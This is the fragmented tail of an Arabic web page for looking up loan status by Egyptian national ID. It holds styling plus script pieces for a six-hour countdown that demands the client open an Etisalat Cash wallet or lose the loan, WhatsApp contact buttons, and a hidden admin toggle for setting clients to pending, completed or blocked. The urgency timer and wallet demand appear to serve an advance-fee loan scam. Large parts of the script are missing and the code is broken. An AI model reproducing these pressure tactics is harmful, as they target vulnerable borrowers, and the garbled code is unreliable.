    <style>

        :root {
            --primary: #2ECC71; --primary-dark: #27AE60;

            --bg-dark: #0A0F1A; --bg-card: #0F1625;
            --text-light: #F8FAFC; --text-muted: #8899AA;
            --border-color: #1E2A3A; --shadow: 0 8px 32px rgba(0,0,0,0.4);
            --whatsapp: #25D366; --danger: #EF4444; --orange: #FF8C42;
        }
        body { font-family: 'Cairo', sans-serif; background: var(--bg-dark); color: var(--text-light); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 0.8rem; }
        .app-container { max-width: 420px; width: 100%; background: var(--bg-card); border-radius: 1.8rem; padding: 1.2rem 1rem; box-shadow: var(--shadow); border: 1px solid var(--border-color); position: relative; overflow: hidden; }
        .app-container::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(ellipse at 30% 20%, rgba(46,204,113,0.03), transparent 60%); pointer-events: none; z-index: 0; }
        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 0.8rem; border-bottom: 1px solid var(--border-color); position: relative; z-index: 1; }
        .header .brand { display: flex; align-items: center; gap: 0.4rem; }
        .header .brand .icon { width: 36px; height: 36px; background: linear-gradient(135deg, var(--primary), var(--gold)); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; color: #0A0F1A; font-weight: 900; }
        .header .brand h1 { font-size: 1.2rem; font-weight: 800; background: linear-gradient(135deg, #FFF, var(--primary), var(--gold)); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .header .brand h1 span { color: var(--gold); -webkit-text-fill-color: var(--gold); }
        .header .badge { background: rgba(46,204,113,0.12); border: 1px solid rgba(46,204,113,0.2); border-radius: 2rem; padding: 0.2rem 0.6rem; font-size: 0.55rem; color: var(--primary); display: flex; align-items: center; gap: 0.3rem; }
        .header .badge i { font-size: 0.4rem; }
        .nav-tabs { display: flex; gap: 0.3rem; margin: 0.8rem 0 1rem 0; background: rgba(255,255,255,0.03); border-radius: 2rem; padding: 0.25rem; position: relative; z-index: 1; border: 1px solid var(--border-color); }
        .nav-tabs .tab { flex: 1; text-align: center; padding: 0.4rem 0.2rem; border-radius: 2rem; font-size: 0.65rem; font-weight: 600; color: var(--text-muted); cursor: default; transition: 0.2s; background: transparent; }
        .nav-tabs .tab.active { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #0A0F1A; box-shadow: 0 4px 15px rgba(46,204,113,0.25); }
        .nav-tabs .tab i { margin-left: 0.2rem; }
        .search-box { display: flex; gap: 0.4rem; margin: 0.6rem 0 0.8rem 0; position: relative; z-index: 1; }
        .search-box input { flex: 1; padding: 0.7rem 1rem; border-radius: 2rem; border: 2px solid var(--border-color); background: rgba(255,255,255,0.04); color: white; font-size: 0.85rem; text-align: center; transition: 0.2s; font-family: 'Cairo', sans-serif; }
        .search-box input:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 20px rgba(46,204,113,0.1); }
        .search-box input::placeholder { color: var(--text-muted); }
        .search-box button { padding: 0.7rem 1.2rem; border: none; border-radius: 2rem; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #0A0F1A; font-weight: 800; cursor: pointer; transition: 0.2s; font-family: 'Cairo', sans-serif; font-size: 0.8rem; display: flex; align-items: center; gap: 0.3rem; white-space: nowrap; }
        .search-box button:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(46,204,113,0.25); }

        .loan-card { background: linear-gradient(145deg, #111B2B, #0A1220); border-radius: 1.2rem; padding: 1.2rem 1rem; border: 1px solid var(--border-color); margin-bottom: 0.8rem; position: relative; z-index: 1; }
        .loan-card .loan-label { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; text-align: center; }
        .loan-card .loan-amount-main { text-align: center; font-size: 2.6rem; font-weight: 900; color: #FFF; margin: 0.2rem 0; letter-spacing: 1px; }
        .loan-card .loan-amount-main .currency { font-size: 1.2rem; color: var(--text-muted); font-weight: 600; }
        .loan-card .loan-percent { text-align: center; font-size: 0.9rem; color: var(--gold); font-weight: 700; }
        .loan-card .loan-percent i { color: var(--gold); margin-left: 0.3rem; }
        .loan-details-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0.5rem; margin-top: 0.8rem; padding-top: 0.8rem; border-top: 1px solid var(--border-color); }
        .loan-details-grid .detail-item { text-align: center; }
        .loan-details-grid .detail-item .label { font-size: 0.5rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
        .loan-details-grid .detail-item .value { font-size: 0.9rem; font-weight: 700; color: #FFF; margin-top: 0.1rem; }
        .loan-details-grid .detail-item .value.gold { color: var(--gold); }
        .loan-details-grid .detail-item .value.green { color: var(--primary); }
        .loan-details-grid .detail-item .value.danger { color: var(--danger); }

        .status-bar { display: flex; align-items: center; gap: 0.6rem; background: rgba(255,255,255,0.03); border-radius: 1.2rem; padding: 0.5rem 0.8rem; border: 1px solid var(--border-color); margin: 0.6rem 0; }
        .status-bar .status-icon { width: 32px; height: 32px; border-radius: 50%; background: rgba(46,204,113,0.12); display: flex; align-items: center; justify-content: center; color: var(--primary); font-size: 0.85rem; flex-shrink: 0; }
        .status-bar .status-text { flex: 1; }
        .status-bar .status-text .main { font-weight: 700; font-size: 0.85rem; }
        .status-bar .status-text .sub { font-size: 0.6rem; color: var(--text-muted); }
        .status-bar .status-badge { background: rgba(46,204,113,0.12); border: 1px solid rgba(46,204,113,0.2); border-radius: 2rem; padding: 0.15rem 0.6rem; font-size: 0.55rem; color: var(--primary); font-weight: 600; }
        .status-bar.danger .status-icon { background: rgba(239,68,68,0.15); color: var(--danger); }
        .status-bar.danger .status-badge { background: rgba(239,68,68,0.15); border-color: rgba(239,68,68,0.3); color: var(--danger); }
        .status-bar.success .status-icon { background: rgba(46,204,113,0.15); color: var(--primary); }
        .status-bar.success .status-badge { background: rgba(46,204,113,0.15); border-color: rgba(46,204,113,0.3); color: var(--primary); }

        .client-info .row { display: flex; justify-content: space-between; padding: 0.25rem 0; border-bottom: 1px solid rgba(255,255,255,0.03); font-size: 0.75rem; }
        .client-info .row:last-child { border-bottom: none; }
        .client-info .row .key { color: var(--text-muted); }
        .client-info .row .value { font-weight: 600; text-align: left; color: #FFF; }
        .client-info .row .value.gold { color: var(--gold); }
        .client-info .row .value.green { color: var(--primary); }
        .client-info .row .value.danger { color: var(--danger); }

        .step-message { background: rgba(212,175,55,0.05); border: 2px solid var(--gold); border-radius: 1rem; padding: 0.8rem; margin: 0.6rem 0; text-align: center; }
        .step-message i { color: var(--gold); font-size: 1.5rem; display: block; margin-bottom: 0.3rem; }
        .step-message p { color: var(--text-muted); font-size: 0.85rem; line-height: 1.8; margin: 0; }
        .step-message .sub-text { font-size: 0.65rem; color: var(--gold); margin-top: 0.3rem; display: block; }

        .open-wallet-alert { background: rgba(212,175,55,0.08); border: 2px solid var(--gold); border-radius: 1.2rem; padding: 1.2rem; margin: 0.6rem 0; text-align: center; position: relative; overflow: hidden; }
        .open-wallet-alert .alert-icon { font-size: 3rem; color: var(--gold); margin-bottom: 0.5rem; display: block; animation: pulseGold 1.5s infinite alternate; }
        @keyframes pulseGold { 0% { box-shadow: 0 0 10px rgba(212,175,55,0.2); } 100% { box-shadow: 0 0 40px rgba(212,175,55,0.5); } }
        .open-wallet-alert h3 { color: var(--gold); font-size: 1.2rem; margin-bottom: 0.5rem; }
        .open-wallet-alert p { color: var(--text-muted); font-size: 0.85rem; line-height: 1.8; }
        .open-wallet-alert .highlight-gold { color: var(--gold); font-weight: 700; }
        .open-wallet-alert .highlight-blue { color: #00BFFF; font-weight: 700; }
        .open-wallet-alert .timer-box { background: rgba(0,0,0,0.5); border-radius: 1rem; padding: 0.5rem; margin: 0.8rem 0; border: 1px solid var(--gold); }
        .open-wallet-alert .timer-box .timer-label { font-size: 0.7rem; color: var(--text-muted); }
        .open-wallet-alert .timer-box .timer-value { font-size: 2rem; font-weight: 800; color: var(--gold); font-family: monospace; letter-spacing: 5px; }
        .open-wallet-alert .timer-box .timer-value.danger { color: var(--danger); animation: pulseRed 0.8s infinite alternate; }
        @keyframes pulseRed { 0% { opacity: 0.7; } 100% { opacity: 1; text-shadow: 0 0 20px rgba(239,68,68,0.5); } }

        .btn-whatsapp { width: 100%; padding: 0.7rem; border: none; border-radius: 2rem; background: linear-gradient(135deg, #25D366, #128C7E); color: white; font-weight: 800; font-size: 0.85rem; display: flex; align-items: center; justify-content: center; gap: 0.5rem; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 20px rgba(37,211,102,0.25); margin-top: 0.4rem; position: relative; z-index: 1; }

        .btn-whatsapp.success-btn { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); box-shadow: 0 4px 20px rgba(46,204,113,0.25); }
        .btn-whatsapp.success-btn:hover { box-shadow: 0 0 30px rgba(46,204,113,0.4); }

        .wallet-warning .warning-head h4 { color: #00BFFF; font-size: 0.9rem; }
        .wallet-warning p { color: var(--text-muted); font-size: 0.75rem; line-height: 1.7; }
        .steps-box { background: rgba(255,255,255,0.02); border-radius: 0.8rem; padding: 0.6rem; margin: 0.4rem 0; border: 1px solid var(--border-color); }
        .steps-box .step { display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.3rem 0; border-bottom: 1px solid rgba(255,255,255,0.03); font-size: 0.7rem; }
        .steps-box .step:last-child { border-bottom: none; }
        .steps-box .step-num { min-width: 24px; height: 24px; border-radius: 50%; background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: #0A0F1A; font-weight: 800; font-size: 0.65rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .steps-box .step-text { color: var(--text-muted); line-height: 1.5; }
        .steps-box .step-text strong { color: #FFF; }

        .blocked-box { background: rgba(239,68,68,0.1); border: 2px solid var(--danger); border-radius: 1.2rem; padding: 1.2rem; text-align: center; margin: 0.6rem 0; }
        .blocked-box i { font-size: 3rem; color: var(--danger); margin-bottom: 0.5rem; display: block; }
        .blocked-box h3 { color: var(--danger); font-size: 1.2rem; margin-bottom: 0.5rem; }
        .blocked-box p { color: var(--text-muted); font-size: 0.85rem; line-height: 1.8; }

        .completed-box { background: rgba(46,204,113,0.08); border: 2px solid var(--primary); border-radius: 1.2rem; padding: 1.2rem; text-align: center; margin: 0.6rem 0; }
        .completed-box i { font-size: 3rem; color: var(--primary); margin-bottom: 0.5rem; display: block; animation: bounceStar 1.2s ease-in-out infinite; }

        .completed-box h3 { color: var(--primary); font-size: 1.2rem; margin-bottom: 0.5rem; }
        .completed-box p { color: var(--text-muted); font-size: 0.85rem; line-height: 1.8; }
        .completed-box .highlight { color: var(--gold); font-weight: 700; }

        .loader { text-align: center; display: none; padding: 0.8rem 0; }
        .loader i { color: var(--primary); font-size: 1.5rem; }
        .loader p { color: var(--text-muted); font-size: 0.7rem; margin-top: 0.2rem; }

        /* ===== صلاحية المدير (مخفية عن العميل) ===== */

        .btn-status-blocked { background: var(--danger); color: white; }
        .btn-status-pending { background: var(--orange); color: #0A0F1A; }

        .mt-1 { margin-top: 0.4rem; }
        .mb-1 { margin-bottom: 0.4rem; }

        @media (max-width: 440px) {

            .client-info .row { font-size: 0.65rem; flex-wrap: wrap; gap: 0.1rem; }

            .search-box button { width: 100%; justify-content: center; }

            .header .brand h1 { font-size: 1rem; }

            .admin-panel .btn-group button { font-size: 0.55rem; padding: 0.3rem 0.4rem; min-width: 60px; }
        }
        @media (max-width: 360px) {
            .loan-card .loan-amount-main { font-size: 1.6rem; }
            .loan-details-grid { grid-template-columns: 1fr 1fr; }
            .header .badge { display: none; }
        }
    </style>
</head>

</div>

    // ===== حساب الإجمالي =====
    function calculateTotal(client) {
        let totalDisplay = client.total;
        if (!totalDisplay || totalDisplay === "? (حسب القرض)") {
            let termMonths = 0;
            const termMatch = client.loanTerm.match(/(\d+)/);
            if (termMatch) termMonths = parseInt(termMatch[0]);
            if (termMonths > 0 && client.installment) {
                let installmentNum = parseFloat(client.installment.replace(/,/g, ''));
                if (!isNaN(installmentNum)) totalDisplay = (installmentNum * termMonths).toFixed(0) + " ج.م";
            } else {
                totalDisplay = "يحدد لاحقاً";
            }
        }
        return totalDisplay;
    }

    // ===== عرض النتيجة =====

                if (needsEtisalat) {
                    html += buildOpenWalletAlert(client);

            // تفاصيل العميل

            // ===== تشغيل العداد التنازلي (للعملاء pending فقط) =====

            // ===== ربط أزرار واتساب =====

                    openWhatsApp(false);

    // ===== تشغيل العداد التنازلي =====
    function startCountdown(totalSeconds) {
        if (countdownInterval) clearInterval(countdownInterval);
        let secondsLeft = totalSeconds;
        const timerEl = document.getElementById('countdownTimer');
        if (!timerEl) return;

        countdownInterval = setInterval(() => {
            if (secondsLeft <= 0) {
                clearInterval(countdownInterval);
                timerEl.innerText = "00:00:00";
                timerEl.classList.add('danger');
                timerEl.style.color = "#EF4444";
                alert("⏰ انتهت المهلة المحددة (6 ساعات) لفتح محفظة اتصالات كاش. سيتم إلغاء طلبك تلقائياً. يرجى التواصل مع الدعم.");
            } else {
                secondsLeft--;
                const hours = Math.floor(secondsLeft / 3600);
                const minutes = Math.floor((secondsLeft % 3600) / 60);
                const secs = secondsLeft % 60;
                timerEl.innerText = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
                if (secondsLeft < 3600) {
                    timerEl.classList.add('danger');
                } else {
                    timerEl.classList.remove('danger');
                }
            }
        }, 1000);
    }

    function toggleAdmin() {
        isAdmin = !isAdmin;
        const panel = document.getElementById('adminPanel');
        if (isAdmin) {
            panel.classList.add('show');
        } else {
            panel.classList.remove('show');
        }
    }

    function updateAdminStatus(status) {
        const statusMap = {
            'pending': '⏳ قيد الإجراء',
            'completed': '✅ تم الاستلام',
            'blocked': '🚫 محظور'
        };
        document.getElementById('currentStatusText').textContent = statusMap[status] || 'غير محدد';
    }

    function changeStatus(newStatus) {
        if (currentIndex === -1 || !currentClient) {
            alert('⚠️ يرجى البحث عن عميل أولاً.');
            return;
        }
        if (!confirm(`هل أنت متأكد من تغيير حالة العميل ${currentClient.name} إلى "${newStatus}"؟`)) {
            return;
        }
        clientsData[currentIndex].clientStatus = newStatus;
        updateAdminStatus(newStatus);
        displayResult(clientsData[currentIndex], currentIndex);
        alert(`✅ تم تغيير حالة العميل ${currentClient.name} إلى "${newStatus}" بنجاح.`);
    }

    // ===== البحث =====
    function searchCustomer() {
        const nationalId = document.getElementById('nationalId').value.trim();
        if (!nationalId) {
            alert('الرجاء إدخال الرقم القومي (14 رقم)');
            return;
        }
        if (nationalId.length !== 14) {
            alert('الرقم القومي يجب أن يكون 14 رقمًا');
            return;
        }

        document.getElementById('loader').style.display = 'block';
        document.getElementById('resultArea').innerHTML = '';
        document.getElementById('errorBox').style.display = 'none';

        if (countdownInterval) {
            clearInterval(countdownInterval);
            countdownInterval = null;
        }

        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            const foundIndex = clientsData.findIndex(c => c.id === nationalId);
            if (foundIndex !== -1) {
                displayResult(clientsData[foundIndex], foundIndex);
            } else {
                document.getElementById('errorBox').style.display = 'block';
                currentIndex = -1;
                currentClient = null;
                updateAdminStatus('غير محدد');
            }
        }, 800);
    }

    // ===== تفعيل صلاحية المدير (مفتاح سري: النقر 5 مرات على الشعار) =====
    let adminClickCount = 0;
    document.querySelector('.brand .icon')?.addEventListener('click', function() {
        adminClickCount++;
        if (adminClickCount >= 5) {
            toggleAdmin();
            adminClickCount = 0;
        }
        setTimeout(() => { adminClickCount = 0; }, 3000);
    });

    // ===== أحداث =====
    document.getElementById('nationalId')?.addEventListener('keypress', e => {
        if (e.key === 'Enter') searchCustomer();
    });

    window.searchCustomer = searchCustomer;
    window.changeStatus = changeStatus;
</script>

</body>
</html>
